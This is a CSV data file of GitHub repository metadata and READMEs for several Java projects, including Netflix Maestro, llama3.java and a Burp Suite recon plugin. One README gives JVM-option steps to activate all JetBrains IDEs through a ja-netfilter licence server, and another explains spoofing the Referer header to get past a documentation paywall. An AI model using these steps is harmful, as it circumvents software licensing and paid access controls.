repo,branch,readme,description,topics,createdAt,lastCommitDate,lastReleaseDate,releases,contributors,pulls,commits,issues,forks,stars,branches,workflows,license,language
Netflix/maestro,main,"Maestro
===================================
[Maestro](https://netflixtechblog.com/orchestrating-data-ml-workflows-at-scale-with-netflix-maestro-aaa2b41b800c)
is a general-purpose workflow orchestrator that 
provides a fully managed workflow-as-a-service (WAAS) to the data platform users at Netflix.

It serves thousands of users, including data scientists, data engineers, machine learning engineers,
software engineers, content producers, and business analysts, for various use cases.
It schedules hundreds of thousands of workflows, millions of jobs every day
and operate with a strict SLO even when there are spikes in the traffic.
Maestro is highly scalable and extensible to support existing and new use cases and offers enhanced usability to end users.

You can read more details about it in our latest [blog post](https://netflixtechblog.com/maestro-netflixs-workflow-orchestrator-ee13a06f9c78).

# Get started
## Prerequisite
- Git
- Java 21
- Gradle
- Docker


## Build it
- `./gradlew build`

## Run it
- `./gradlew bootRun`

## Create a sample workflow
- `curl --header ""user: tester"" -X POST 'http://127.0.0.1:8080/api/v3/workflows' -H ""Content-Type: application/json"" -d @maestro-server/src/test/resources/samples/sample-dag-test-1.json`

## Get the sample workflow definition
- `curl -X GET 'http://127.0.0.1:8080/api/v3/workflows/sample-dag-test-1/versions/latest'`

## Trigger to run the sample workflow
- `curl --header ""user: tester"" -X POST 'http://127.0.0.1:8080/api/v3/workflows/sample-dag-test-1/versions/latest/actions/start' -H ""Content-Type: application/json"" -d '{""initiator"": {""type"": ""manual""}}'`

## Get the sample workflow instance
- `curl -X GET 'http://127.0.0.1:8080/api/v3/workflows/sample-dag-test-1/instances/1/runs/1'`

## Delete the sample workflow and its data
- `curl --header ""user: tester"" -X DELETE 'http://127.0.0.1:8080/api/v3/workflows/sample-dag-test-1'`

# License
Copyright 2024 Netflix, Inc.

Licensed under the Apache License, Version 2.0 (the ""License"");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an ""AS IS"" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
",Maestro: Netflix’s Workflow Orchestrator,,2024-04-17T01:15:56Z,2024-08-09T16:56:13Z,,0,710,17,26,22,199,3253,1,1,Apache-2.0,Java
shuanx/BurpAPIFinder,main,"# BurpAPIFinder
![](https://img.shields.io/badge/Author-Shaun-blue)
![](https://img.shields.io/badge/JDK-9+-yellow)
![](https://img.shields.io/badge/捡漏是门艺术-往往有意想不到的成果-red)
> 攻防演练过程中，我们通常会用浏览器访问一些资产，但很多未授权/敏感信息/越权隐匿在已访问接口过html、JS文件等，通过该BurpAPIFinder插件我们可以：  
> 1、发现通过某接口可以进行未授权/越权获取到所有的账号密码、私钥、凭证  
> 2、发现通过某接口可以枚举用户信息、密码修改、用户创建接口  
> 3、发现登陆后台网址  
> 4、发现在html、JS中泄漏账号密码或者云主机的Access Key和SecretKey  
> 5、自动提取js、html中路径进行访问，也支持自定义父路径访问
> ...  

![img.png](images/main.png)

## 功能如下
> 如果有更好的建议或者期待使用的，点个免费的Star
- [x] 提取网站的URL链接和解析JS文件中的URL链接(不单单正则、支持多种模式提取)
- [x] 前段界面可自行定义敏感关键词、敏感url匹配
- [x] 界面可配置的开启主动接口探测、敏感信息获取  
- [x] 支持用户自定义父路径重新开发扫描任务
- [x] 集成主流攻防场景敏感信息泄漏的指纹库  
![img.png](images/config.png)
- [x] 集成HaE的敏感信息识别指纹
- [x] 集成APIKit的敏感信息识别指纹
- [x] 集成sweetPotato的敏感信息识别指纹

## 使用说明
1、下载右侧Releases下的jar包  
2、如原先有使用旧版本的，需要删除掉原先同BurpAPIFinder.jar同目录下的BurpAPIFinder.db和finger-tmp.json文件后再加载
3、加载完后，不需要任何其他配置，只需要你在访问的网站的BurpSuite的代码，就会进行敏感指纹识别，有空去看看该网站看有没有匹配到铭感信息即可S

## 闲聊/优化/建议/问题反馈群
<img src=""images/weixinqun.png"" alt=""img.png"" width=""200""/>

## BurpFingerPrint
额外推荐笔者另一个好用的插件 BurpFinderPrint
GITHUB: https://github.com/shuanx/BurpFingerPrint
该插件为作者精心开发出来, 旨在打造最强免费指纹识别库和弱口令探测库


## 免责声明

本工具仅作为安全研究交流，请勿用于非法用途。如您在使用本工具的过程中存在任何非法行为，您需自行承担相应后果，本人将不承担任何法律及连带责任。
",攻防演练过程中，我们通常会用浏览器访问一些资产，但很多未授权/敏感信息/越权隐匿在已访问接口过html、JS文件等，该插件能让我们发现未授权/敏感信息/越权/登陆接口等。,,2024-04-04T02:52:42Z,2024-09-05T00:42:56Z,2024-05-29T10:10:31Z,1,1,0,187,4,48,824,1,0,,Java
NotoChen/Jetbrains-Help,main,"# Jetbrains-Help

## 目录
- [项目说明](#项目说明)
  - [仓库简要](#仓库简要)
  - [仓库趋势](#仓库趋势)
  - [支持版本](#支持版本)
  - [项目版本](#项目版本)
  - [功能列表](#功能列表)
- [运行教程](#运行教程)
  - [拉取项目](#拉取项目)
  - [配置环境](#配置环境)
    - [本地运行](#本地运行)
    - [容器运行](#容器运行)
  - [运行服务](#运行服务)
    - [本地运行](#本地运行)
      - [有IDE](#有IDE)
      - [无IDE](#无IDE)
    - [容器运行](#容器运行)
- [使用教程](#使用教程)
  - [下载依赖](#下载依赖)
  - [依赖配置](#依赖配置)
    - [可打开IDE](#可打开IDE)
    - [不可打开IDE](#可打开IDE)

## 项目说明
### 仓库简要
<p align=""left"">
    <img src=""https://img.shields.io/github/stars/NotoChen/Jetbrains-Help"">
    <img src=""https://img.shields.io/github/forks/NotoChen/Jetbrains-Help"">
    <img src=""https://img.shields.io/github/repo-size/notochen/jetbrains-help"">
    <img src=""https://img.shields.io/github/license/notochen/jetbrains-help"">
</p>

### 仓库趋势
<p align=""center"">
    <img src=""https://api.star-history.com/svg?repos=NotoChen/Jetbrains-Help&type=Date"">
</p>


### 支持版本
<p align=""left"">
    <img src=""https://img.shields.io/badge/Jetbrains_Version-All-%23000000?logo=jetbrains&labelColor=black&color=white"">
</p>

### 项目版本
<p align=""left"">
    <img src=""https://img.shields.io/badge/Java_Version-21-%23000000?logo=openjdk&&color=white"">
    <img src=""https://img.shields.io/badge/Maven_Version-Laster-%23000000?logo=apachemaven&&color=white"">
    <img src=""https://img.shields.io/badge/SpringBoot_Version-Laster-%23000000?logo=springboot&&color=white"">
    <img src=""https://img.shields.io/badge/Thymeleaf_Version-Laster-%23000000?logo=thymeleaf&&color=white"">
</p>

### 功能列表

| 功能                       | DID |
|:-------------------------|:---:|
| Jetbrains全产品支持           |  ✅  |
| Jetbrains全插件支持           |  ✅  |
| 插件库全自动订阅官网更新             |  ✅  |
| 公私钥/证书, 自动生成管理           |  ✅  |
| power.conf文件自动配置         |  ✅  |
| ja-netfilter.zip自动打包     |  ✅  |
| 自定义License Show          |  ✅  |
| 支持实时搜索                   |  ✅  |
| 插件默认按名称排序                |  ✅  |
| 支持local/jar/dockerfile运行 |  ✅  |
| 单码全家桶激活支持                |  ✅  |
| ……                       | ☑️  |

## 运行教程

> 以下是该项目详细运行教程, 尽量争取可以在各个环境下运作

### 拉取项目

`clone` 本项目至本地

### 配置环境

#### 本地运行

1. 需要 `Java` 环境，并且版本要求 **21**
2. 需要 `Maven` 环境，版本无要求，但建议采用最新版

#### 容器运行
1. 需要 `Docker` 环境，版本无要求，但建议采用最新版
2. 如有 `Docker-Compos` 环境，更佳，但此环境**非必须**

### 运行服务

#### 本地运行

##### 有IDE

1. 通过 `IDE` `Open` 项目
2. 配置项目相关环境
3. 运行 [JetbrainsHelpApplication.java](src%2Fmain%2Fjava%2Fcom%2Fjetbrains%2Fhelp%2FJetbrainsHelpApplication.java)

##### 无IDE

1. 系统终端 `Cd` 进入项目根目录
2. 运行打包命令 `mvn clean package`
3. 运行启动命令 `java -jar target/Jetbrains-Help.jar`

#### 容器运行

1. 系统终端 `Cd` 进入项目根目录

##### 使用Docker
2. 运行 `Docker` 命令 `docker build -t jetbrains-help .`
3. **或者** 执行 [build-with-docker.sh](build-with-docker.sh)
4. 运行 `Docker` 命令 `docker run -d -p 10768:10768 --name jetbrains-help jetbrains-help`
5. **或者** 执行 [run-with-docker.sh](run-with-docker.sh)

##### 使用Docker-Compose

2. 运行 `Docker-Compose` 命令 `docker compose build && docker compose up -d`
3. **或者** 执行 [run-with-docker-compose.sh](run-with-docker-compose.sh)

### 使用教程

项目运行后, `Console` 会打印相关服务地址, 默认端口为 `10768`, 默认地址为 `127.0.0.1:10768`

可以点此直接访问 [Jetbrains-Help](http://127.0.0.1:10768)

#### 下载依赖

阅读 **页面头部**，根据头部指引下载 `ja-netfilter.zip`

移动本地 `ja-netfilter.zip` 到自定义目录，**解压**

#### 依赖配置

##### 可打开IDE

- `进入IDE`
- **点击** 菜单栏 `帮助（help）`
- **点击** `编辑自定义虚拟机选型`
- **键入** 如下配置
```
-javaagent:you-path/ja-netfilter.jar
--add-opens=java.base/jdk.internal.org.objectweb.asm=ALL-UNNAMED
--add-opens=java.base/jdk.internal.org.objectweb.asm.tree=ALL-UNNAMED
```
- 将`you-path`替换为 [下载依赖](#下载依赖) 步骤中自定义目录
- **重启** `IDE`

##### 不可打开IDE

- **下载安装** [Toolbox](https://www.jetbrains.com/toolbox-app/)
- **启动** `Toolbox`
- **点击** `Toolbox` 找到对应 `IDE` 
- **点击** `IDE` 右侧的 `⋮`
- **点击** `设置`
- 找到 `配置` 选项
- **点击** `编辑JVM选项`
- **键入** 如下配置
```
-javaagent:you-path/ja-netfilter.jar
--add-opens=java.base/jdk.internal.org.objectweb.asm=ALL-UNNAMED
--add-opens=java.base/jdk.internal.org.objectweb.asm.tree=ALL-UNNAMED
```
- 将`you-path`替换为 [下载依赖](#下载依赖) 步骤中自定义目录
- **重启** `IDE`

",一个有助于提升Jetbrains服务商相关产品易用性的工具,,2024-04-11T07:43:19Z,2024-09-15T15:24:49Z,,0,4,5,43,0,206,388,2,0,MIT,Java
gahogg/Leetcode-Solutions,main,,"The repository for all of the solutions to the Leetcode problems solved on my YouTube, Instagram and TikTok","algorithms,datastructures,dsa,dsa-algorithm,leetcode,leetcode-solutions",2024-05-01T13:41:32Z,2024-08-28T19:10:16Z,,0,4,20,185,2,91,359,1,0,,Java
Dev4Mod/WaEnhancer,master,"# WaEnhancer
<div align=""center"">
  WaEnhancer is an Xposed module that enhances your WhatsApp experience.<br><br>
  Please note that this project is currently in development, so bugs and crashes may occur. If you encounter any issues report them in our group or create an [issues](https://github.com/Dev4Mod/WaEnhancer/issues) here.
</div>


## Main Features
<details closed>
  <summary>Privacy</summary>

  - `Hide Forwarded Tag`
  - `Remove Forward Limit`
  - `Disable Pinned Chats Limit`
  - `Freeze Last Seen`
  - `Hide Status View`
  - `Hide Blue Ticks`
  - `Hide View Once and Audio Seen`
  - `Hide Delivered`
  - `Hide Typing`
  - `Hide Recording Audio`
  - `Disable View Once`
  - `Send Blue Ticks upon Reply`
  - `Delete for everyone on all messages`
  - `Show Edited Message History`
  - `Remove See More Button`
  - `Anti Revoke Status`
  - `Anti Revoke Message`
</details>

<details closed>
  <summary>Home Screen</summary>

  - `Show Name`
  - `Show Bio`
  - `Show DND Button`
  - `Separate Groups`
  - `Hide Archived Chats`
  - `Show Online Dot in Conversation List`
  - `Remove Channel Recommendations`
  - `Hide Tabs on Home`
  - `Enable IGStatus on Home Screen`
  - `Filter Chats`
</details>  

<details closed>
  <summary>General</summary>

  - `Time in 12-Hour Format`
  - `Seconds on Timestamp`
  - `Buttons Stroke`
  - `Menu Icons`
  - `Outlined Icons`
  - `New Settings Style`
</details>


<details closed>
  <summary>Media</summary>

  - `Download Status`
  - `Download View Once`
  - `HD Quality Videos`
  - `HD Quality Images`
  - `Send videos in 60FPS`
  - `Send videos in original resolution`
</details>

## Use
 <details closed>
  <summary>Colors</summary>

  - `New WhatsApp theme`
  - `Customize your colors`
</details>

## Installation
1. Ensure that your device is rooted.
2. Install the Xposed Framework on your device.
3. Download the WaEnhancer from the [Actions](https://github.com/Dev4Mod/WaEnhancer/actions) section.
4. Install the WaEnhancer APK.
5. Enable the WaEnhancer module in the Xposed Installer app.

## Support
If you encounter any issues or have questions about WaEnhancer, please [Visit Telegram](https://t.me/waenhancer).

## License
This project is licensed under the GNU License - see the [LICENSE](LICENSE) file for details.

## Thanks

* Bootloader Spoofer (Thanks to [chiteroman](https://github.com/chiteroman))
* LSPosed Framework Core Patch (thanks to the [LSPosed](https://github.com/LSPosed) team)
* Bridge Client and Server (Thanks to [rhunk](https://github.com/rhunk/))

---

**Note**: Please use WaEnhancer responsibly and in compliance with the terms and conditions of the apps you are modifying. Misuse of this tool may lead to legal consequences.
",WhatsApp tools for Android,"android,whatsapp,xposed-module",2024-04-30T23:56:59Z,2024-09-18T21:04:23Z,2024-09-18T21:04:23Z,56,11,37,557,21,46,346,1,1,GPL-3.0,Java
mukel/llama3.java,main,"# Llama3.java

Practical [Llama 3](https://github.com/meta-llama/llama3), [3.1](https://llama.meta.com/docs/model-cards-and-prompt-formats/llama3_1) and [3.2](https://ai.meta.com/blog/llama-3-2-connect-2024-vision-edge-mobile-devices/) inference implemented in a single Java file.

<p align=""center"">
  <img width=""700"" src=""https://github.com/mukel/llama3.java/assets/1896283/7939588c-c0ff-4261-b67f-8a54bad59ab5"">
</p>

This project is the successor of [llama2.java](https://github.com/mukel/llama2.java)
based on [llama2.c](https://github.com/karpathy/llama2.c) by [Andrej Karpathy](https://twitter.com/karpathy) and his [excellent educational videos](https://www.youtube.com/c/AndrejKarpathy).

Besides the educational value, this project will be used to test and tune compiler optimizations and features on the JVM, particularly for the [Graal compiler](https://www.graalvm.org/latest/reference-manual/java/compiler).

## Features

 - Single file, no dependencies
 - [GGUF format](https://github.com/ggerganov/ggml/blob/master/docs/gguf.md) parser
 - Llama 3 tokenizer based on [minbpe](https://github.com/karpathy/minbpe)
 - Llama 3 inference with Grouped-Query Attention
 - Support Llama 3.1 (ad-hoc RoPE scaling) and 3.2 (tie word embeddings)
 - Support for Q8_0 and Q4_0 quantizations
 - Fast matrix-vector multiplication routines for quantized tensors using Java's [Vector API](https://openjdk.org/jeps/469)
 - Simple CLI with `--chat` and `--instruct` modes.

Here's the interactive `--chat` mode in action: 

<p align=""center"">
  <img width=""700"" src=""https://github.com/mukel/llama3.java/assets/1896283/2245f59d-6c86-49c3-87d3-8b1a2cb83a91"">
</p>

## Setup

Download pure `Q4_0` and (optionally) `Q8_0` quantized .gguf files from:
  - https://huggingface.co/mukel/Llama-3.2-1B-Instruct-GGUF
  - https://huggingface.co/mukel/Llama-3.2-3B-Instruct-GGUF
  - https://huggingface.co/mukel/Meta-Llama-3.1-8B-Instruct-GGUF
  - https://huggingface.co/mukel/Meta-Llama-3-8B-Instruct-GGUF

The pure `Q4_0` quantized models are recommended, except for the very small models (1B), please be gentle with [huggingface.co](https://huggingface.co) servers: 
```
# Llama 3.2 (3B)
curl -L -O https://huggingface.co/mukel/Llama-3.2-3B-Instruct-GGUF/resolve/main/Llama-3.2-3B-Instruct-Q4_0.gguf

# Llama 3.2 (1B)
curl -L -O https://huggingface.co/mukel/Llama-3.2-1B-Instruct-GGUF/resolve/main/Llama-3.2-1B-Instruct-Q8_0.gguf

# Llama 3.1 (8B)
curl -L -O https://huggingface.co/mukel/Meta-Llama-3.1-8B-Instruct-GGUF/resolve/main/Meta-Llama-3.1-8B-Instruct-Q4_0.gguf

# Llama 3 (8B)
curl -L -O https://huggingface.co/mukel/Meta-Llama-3-8B-Instruct-GGUF/resolve/main/Meta-Llama-3-8B-Instruct-Q4_0.gguf

# Optionally download the Q8_0 quantized models
# curl -L -O https://huggingface.co/mukel/Meta-Llama-3-8B-Instruct-GGUF/resolve/main/Meta-Llama-3-8B-Instruct-Q8_0.gguf
# curl -L -O https://huggingface.co/mukel/Meta-Llama-3.1-8B-Instruct-GGUF/resolve/main/Meta-Llama-3.1-8B-Instruct-Q8_0.gguf
```

#### Optional: quantize to pure `Q4_0` manually

In the wild, `Q8_0` quantizations are fine, but `Q4_0` quantizations are rarely pure e.g. the `token_embd.weights`/`output.weights` tensor are quantized with `Q6_K`, instead of `Q4_0`.  
A **pure** `Q4_0` quantization can be generated from a high precision (F32, F16, BFLOAT16) .gguf source 
with the `llama-quantize` utility from [llama.cpp](https://github.com/ggerganov/llama.cpp) as follows:

```bash
./llama-quantize --pure ./Meta-Llama-3-8B-Instruct-F32.gguf ./Meta-Llama-3-8B-Instruct-Q4_0.gguf Q4_0
```

## Build and run

Java 21+ is required, in particular the [`MemorySegment` mmap-ing feature](https://docs.oracle.com/en/java/javase/21/docs/api/java.base/java/nio/channels/FileChannel.html#map(java.nio.channels.FileChannel.MapMode,long,long,java.lang.foreign.Arena)).

[`jbang`](https://www.jbang.dev/) is a perfect fit for this use case, just:
```
jbang Llama3.java --help
```
Or execute directly, also via [`jbang`](https://www.jbang.dev/):
```bash 
chmod +x Llama3.java
./Llama3.java --help
```

## Run from source

```bash
java --enable-preview --source 21 --add-modules jdk.incubator.vector LLama3.java -i --model Meta-Llama-3-8B-Instruct-Q4_0.gguf
```

#### Optional: Makefile + manually build and run

A simple [Makefile](./Makefile) is provided, run `make` to produce `llama3.jar` or manually:
```bash
javac -g --enable-preview -source 21 --add-modules jdk.incubator.vector -d target/classes Llama3.java
jar -cvfe llama3.jar com.llama4j.Llama3 LICENSE -C target/classes .
```

Run the resulting `llama3.jar` as follows: 
```bash
java --enable-preview --add-modules jdk.incubator.vector -jar llama3.jar --help
```

## Performance

**Important Note**  
On GraalVM, please note that the Graal compiler doesn't support the Vector API yet, run with `-Dllama.VectorAPI=false`, but expect sub-optimal performance.   
Vanilla OpenJDK 21+ is recommended for now, which supports the Vector API.

### llama.cpp

Vanilla `llama.cpp` built with `make -j 20`.
```bash
./main --version
version: 2879 (4f026363)
built with cc (GCC) 13.2.1 20230801 for x86_64-pc-linux-gnu
```

Executed as follows:
```bash
./main -m ../Meta-Llama-3-8B-Instruct-Q4_0.gguf \
  -n 512 \
  -s 42 \
  -p ""<|start_of_header_id|>user<|end_of_header_id|>Why is the sky blue?<|eot_id|><|start_of_header_id|>assistant<|end_of_header_id|>\n\n"" \
  --interactive-specials
```
Collected the **""eval time""** metric in tokens\s.

### Llama3.java
Running on OpenJDK 21.0.2.

```bash
jbang Llama3.java \
  --model ./Meta-Llama-3-8B-Instruct-Q4_0.gguf \
  --max-tokens 512 \
  --seed 42 \
  --stream false \
  --prompt ""Why is the sky blue?""
```

### Results

#### Notebook Intel 13900H 6pC+8eC/20T 64GB (5200) Linux 6.6.26 
| Model                            | tokens/s | Implementation   |  
|----------------------------------|----------|------------------|
| Llama-3-8B-Instruct-Q4_0.gguf    | 7.53     | llama.cpp        |
| Llama-3-8B-Instruct-Q4_0.gguf    | 6.95     | llama3.java      |
| Llama-3-8B-Instruct-Q8_0.gguf    | 5.16     | llama.cpp        |
| Llama-3-8B-Instruct-Q8_0.gguf    | 4.02     | llama3.java      |

#### Workstation AMD 3950X 16C/32T 64GB (3200) Linux 6.6.25

****Notes**  
*Running on a single CCD e.g. `taskset -c 0-15 jbang Llama3.java ...` since inference is constrained by memory bandwidth.* 

| Model                            | tokens/s | Implementation   |  
|----------------------------------|----------|------------------|
| Llama-3-8B-Instruct-Q4_0.gguf    | 9.26     | llama.cpp        |
| Llama-3-8B-Instruct-Q4_0.gguf    | 8.03     | llama3.java      |
| Llama-3-8B-Instruct-Q8_0.gguf    | 5.79     | llama.cpp        |
| Llama-3-8B-Instruct-Q8_0.gguf    | 4.92     | llama3.java      |

## License

MIT
",Practical Llama 3 inference in Java,"java,llama,llama3,llm,llm-inference,llms",2024-04-25T09:09:02Z,2024-09-26T08:40:20Z,,0,7,6,13,3,41,343,1,0,NOASSERTION,Java
gtrxAC/discord-j2me,main,"# Discord for J2ME
Discord client for Java ME (MIDP 1.0 and 2.0) devices, inspired by [Discord for Symbian](https://github.com/uwmpr/discord-symbian-fixed). Uses proxy servers for the [HTTP](/proxy/) and [gateway](https://github.com/gtrxAC/discord-j2me-server) connection.

Also see [Droidcord](https://github.com/leap0x7b/Droidcord), a Discord client for old Android devices.

![Screenshots](img/screenshots.png)

* [Download](https://github.com/gtrxAC/discord-j2me/releases/latest)
* [FAQ](https://github.com/gtrxAC/discord-j2me/wiki/FAQ)
* [Discord server](https://discord.gg/2GKuJjQagp) (#discord-j2me)
* [Telegram group](https://t.me/dscforsymbian)

## Status
### Working
* Server and channel lists
* Message reading, sending, editing, <abbr title=""Only your own messages"">deleting</abbr>
* Replying to messages
* Reading older messages
* Direct messages and group DMs
* Attachment viewing
* Attachment sending (<abbr title=""Requires FileConnection API or HTML browser with file uploading support"">device dependent</abbr>)
* Gateway/live message updates (<abbr title=""Not supported on MIDP 1.0 and some low-end Samsung devices"">device dependent</abbr>)
* <abbr title=""Not in sync with official clients"">Unread message indicators</abbr>

### Not implemented
* Jumping to messages (e.g. replies)
* Initiating DM conversations
* Ping indicators
* Reactions and emojis

## How to build
1. Install Sun Java Wireless Toolkit 2.5.2 on your computer.
    * If you haven't already, install an older JDK version (e.g. 1.6.0_45).
2. Open Wireless Toolkit and create a new project named `Discord`.
3. Copy the contents of this repository into the project's folder.
    * On Windows, it should be in `C:\Users\yourname\j2mewtk\2.5.2\apps\Discord`
4. Build the project.
    * To create a JAR, go to `Options` -> `Package` -> `Create package`.
    * Optional: to create an obfuscated JAR, go to `Options` -> `Package` -> `Create obfuscated package`.
        * For this, you'll need Proguard installed as part of your WTK.
        * Download one of the older versions [here](https://sourceforge.net/projects/proguard/files/proguard/) (e.g. 3.4).
        * Extract the ZIP and copy the `proguard.jar` file from the `lib` folder into the `bin` folder of your WTK installation.

## Thanks
* [@uwmpr](https://github.com/uwmpr) for formerly hosting the default proxy server
* [@WunderWungiel](https://github.com/WunderWungiel) for formerly hosting the CDN proxy
* [@shinovon](https://github.com/shinovon) for their Java ME [JSON library](https://github.com/shinovon/NNJSON)
* [@saetta06](https://github.com/saetta06) for creating the menu graphics and loading animation",Discord client for Java ME (MIDP 1.0 & 2.0) devices,,2024-04-30T20:54:32Z,2024-09-05T20:48:29Z,2024-07-09T08:28:38Z,10,3,4,141,8,4,229,4,0,MIT,Java
talkpoin/ruoyi-spring-boot-all,main,"
**严正声明：本项目只为了给在校学生和刚刚步入社会又囊中羞涩的年轻人提供一种选择，同时也为了打击中国式伪开源贡献一份力量。**

**如果哪一天芋芋撕掉遮羞布，不割年轻人韭菜，一定不是良心发现或者钱赚够了，只是因为我来过。**

### 不需要199
### 不需要star
### 没有遮羞布


文档验证码: jiankan

Boot 文档验证码：https://doc.iocoder.cn/?code=p70

Cloud 文档验证码：https://cloud.iocoder.cn/?code=p70

如果上面方法不生效，则使用下面方法：

- 打开知识星球链接：https://articles.zsxq.com
- 打开浏览器控制台，点击查看器，替换知识星球的首页地址为：https://doc.iocoder.cn/?code=p70
- 再点击浏览器上面的链接，其原理是伪造Refer源

![123.png](image%2F123.png)

## 模块

| 项目                    | 说明                 |
|-----------------------|--------------------|
| `yudao-dependencies`  | Maven 依赖版本管理       |
| `yudao-framework`     | Java 框架拓展          |
| `yudao-server`        | 管理后台 + 用户 APP 的服务端 |
| `yudao-module-system` | 系统功能的 Module 模块    |
| `yudao-module-member` | 会员中心的 Module 模块    |
| `yudao-module-infra`  | 基础设施的 Module 模块    |
| `yudao-module-bpm`    | 工作流程的 Module 模块    |
| `yudao-module-pay`    | 支付系统的 Module 模块    |
| `yudao-module-mall`   | 商城系统的 Module 模块    |
| `yudao-module-erp`    | ERP 系统的 Module 模块  |
| `yudao-module-crm`    | CRM 系统的 Module 模块  |
| `yudao-module-mp`     | 微信公众号的 Module 模块   |
| `yudao-module-report` | 大屏报表 Module 模块     |


> 白天正常上班写代码，晚上有时间就同步文档(无遮羞布)。
> 
> 在这里跟原作者道个歉，年轻人真的比容易，还望刀下留情，韭菜割的差不多就得了。
",芋道源码(无遮羞布版),,2024-04-18T16:11:43Z,2024-04-19T12:57:55Z,,0,1,0,5,12,94,227,1,0,MIT,Java
839128/bus,main,"<p align=""center"">
  <a href=""https://www.miaixz.org""><img src=""LOGO.svg"" width=""45%""></a>
</p>
<p align=""center"">
  <a href=""http://www.miaixz.org"">http://www.miaixz.org</a>
</p>
<p align=""center"">
  <a target=""_blank"" href=""https://search.maven.org/search?q=org.miaixz"">
    <img src=""https://img.shields.io/badge/maven--central-v8.1.0-blue.svg?label=Maven%20Central"" />
  </a>
  <a target=""_blank"" href=""https://travis-ci.org/839128/bus"">
    <img src=""https://app.travis-ci.com/839128/bus.svg?token=TZPNK5FQiKMp9cao3SnY&branch=main"">
  </a>
  <a target=""_blank"" href=""https://jdk.java.net/"">
    <img src=""https://img.shields.io/badge/Java-17+-green.svg"">
  </a>
  <a target=""_blank"" href=""https://spring.io/projects/spring-boot"">
    <img src=""https://img.shields.io/badge/Spring Boot-3.0.5-brightgreen.svg"">
  </a>
  <a target=""_blank"" href=""https://www.mysql.com"">
    <img src=""https://img.shields.io/badge/Mysql-8.x-blue.svg"">
  </a>
  <a target=""_blank"" href=""http://dubbo.apache.org"">
    <img src=""https://img.shields.io/badge/dubbo-3.2.11-yellow.svg"">
  </a>
  <a target=""_blank"" href=""http://poi.apache.org"">
    <img src=""https://img.shields.io/badge/poi-5.2.5-blue.svg"">
  </a>
  <a target=""_blank"" href=""https://github.com/839128/bus/blob/main/LICENSE"">
    <img src=""https://img.shields.io/badge/license-MIT-green.svg"">
  </a>
</p>

<p align=""center"">
  -- QQ群：839128 --
</p>

---

### ✨ 项目说明

Bus (应用/服务总线) 是一个基础框架、服务套件，它基于Java17+ 编写，参考、借鉴了大量已有框架、组件的设计，可以作为后端服务的开发基础中间件。代码简洁，架构清晰，非常适合学习使用。

很开心地告诉大家这套组件上手和学习难度非常小。如果是以学会使用为目的，只要你会Java语言即可。之前做项目的时候，往往会遇到各种各样的问题，这些问题有可能是会遇到很多次，不善于总结沉淀，这是很多人的一个通病，包括我自己也是。

于是我就萌生了把这些问题沉淀成组件的想法，分享自己成长路线,当然也参考了部分开源项目，资料，文章进行整合的一个提供基础功能的项目。
本项目旨在实现基础能力，不设计具体业务，希望能帮助到大家，也让大家见证我的勤奋与努力，一起进步。

欢迎大家来 这里 踩踩,生命有限！少写重复代码！给颗星奖励下呗~

目标期望能努力打造一套从 基础框架 - 分布式微服务架构 - 持续集成 - 自动化部署 -系统监测等，快速实现业务需求的全栈式技术解决方案。

### ✨ 版本选择

 Bus主要版本 3.x、5.x、6.x、8.x，具体如下：

| 版本  | jdk    | Maven仓库                                                                                  | 主要特点                               |
|-----|--------|------------------------------------------------------------------------------------------|------------------------------------|
| 3.x | jdk1.8 | [org.aoju/bus-all/3.x](https://mvnrepository.com/artifact/org.aoju/bus-all/3.6.9)        | jdk1.8编译                           |
| 5.x | jdk1.8 | [org.aoju/bus-all/5.x ](https://mvnrepository.com/artifact/org.aoju/bus-all/5.9.9)       | jdk1.8编译,使用JavaEE,适配JDK11、17       |
| 6.x | jdk 17 | [org.aoju/bus-all/6.x ](https://mvnrepository.com/artifact/org.aoju/bus-all/6.6.0)       | jdk 17编译,使用Jakarta EE,适配JDK11、17 |
| 8.x | jdk 21 | [org.miaixz/bus-all/8.x ](https://mvnrepository.com/artifact/org.miaixz/bus-all)         | jdk 21编译,使用Jakarta EE,适配JDK11、17、21 |

### ✨ 组件信息

| 完成  | 模块            | 描述信息                                              |
|-----|---------------|---------------------------------------------------|
| [√] | bus-all       | 包含微服务所需的完整模块以及通用组件                                |
| [√] | bus-base      | 基础功能及base相关,实体(Entity),服务(Service),接口(Controller) |
| [√] | bus-bom       | 包含所有组建信息,当然可以通过配置按需加载等                            |
| [√] | bus-cache     | 缓存服务及工具,支持redis,memcached,,hessian等               |
| [√] | bus-core      | 核心功能及工具类,包括常量、线程、类加载器、反射、集合、日期等常用工具               |
| [√] | bus-cron      | 定时器及定时任务等功能                                       |
| [√] | bus-crypto    | 加密解密，支持支持AES/DES/REA/MD5等常用加密算法                   |
| [√] | bus-extra     | 扩展功能及文件操作,FTP/文件/二维码/短信相关支持                       |
| [√] | bus-health    | 应用服务器健康信息，软件硬件信息采集等                               |
| [√] | bus-http      | HTTP功能封装,根据业务场景可使用 Httpd/Httpx/Httpz 等方式          |
| [√] | bus-image     | 图像/影像应用服务，解析预览等                                   |
| [√] | bus-limiter   | 服务限流/降级/提升热点,根据不同业务设置不同策略                         |
| [√] | bus-logger    | 日志信息及功能，动态检测日志实现的方式，使日志使用个更加便利灵活简单                |
| [√] | bus-mapper    | 数据操作,在 MyBatis 的基础上只做增强不做改变，为简化开发、提高效率            |
| [√] | bus-oauth     | 第三方登录,已集成十多家第三方平台(国内外常用的基本都已包含)                   |
| [√] | bus-pager     | 数据分页,mybatis等                                     |
| [√] | bus-office    | office等相关转换及处理,POI封装实现，使Java操作Excel等文件变得简单        |
| [√] | bus-opencv    | 图像识别及分析，提供丰富的图形图像处理算法,跨平台支持等                      |
| [√] | bus-proxy     | 公共代理，使动态代理变得简单                                    |
| [√] | bus-sensitive | 敏感数据脱敏,对应用和使用者透明，业务逻辑无感知，通过配置集成                   |
| [√] | bus-setting   | 设置工具类， 用于支持设置/配置                                  |
| [√] | bus-shade     | Entity,Service,Mapper等相关代码生成工具                    |
| [√] | bus-socket    | 基础NIO/AIO通讯,Socket封装，支持TCP/UDP服务端                 |
| [√] | bus-starter   | SpringBoot starter，spring相关配置，启动及相关配置文件信息         |
| [√] | bus-storage   | 文件存储组件,,支持阿里云、七牛，提供了工厂模式和注入两种集成方式                 |
| [×] | bus-tracer    | 轻量级分布式链路跟踪监控，日志及访问流程追踪以及内部调用链追踪                   |
